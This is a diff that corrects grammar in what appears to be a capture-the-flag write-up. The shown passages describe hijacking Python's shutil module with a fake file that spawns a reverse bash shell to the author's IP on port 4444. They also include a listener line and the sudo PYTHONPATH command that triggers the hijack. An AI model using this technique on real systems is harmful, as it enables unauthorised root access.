@@ -612,7 +612,7 @@ src = '/var/www/html/'
 dst = '/var/backups/html'
 make_archive(dst, 'gztar', src)
 ```
-It import ```make_archive``` function from python module ```shutil```.
+It imports ```make_archive``` function from python module ```shutil```.
 
 So I created a fake ```shutil.py``` inside ```hsn``` folder and write these codes and save it:
 ```
@@ -629,7 +629,7 @@ When it is executed, it will execute ```/bin/bash``` on my IP and port 4444. So 
 listening on [any] 4444 ...
 ```
 
-We create our duplicate shutil library. Let's run the code with this python env path and see if we can get access or not !!
+We created our duplicate shutil library. Let's run the code with this python env path and see if we can get access or not !!
 So, how to execute ```admin_tasks.sh``` script after our changes? Here it is:
 ```
 waldo@admirer:~/hsn$ sudo PYTHONPATH=~/hsn /opt/scripts/admin_tasks.sh
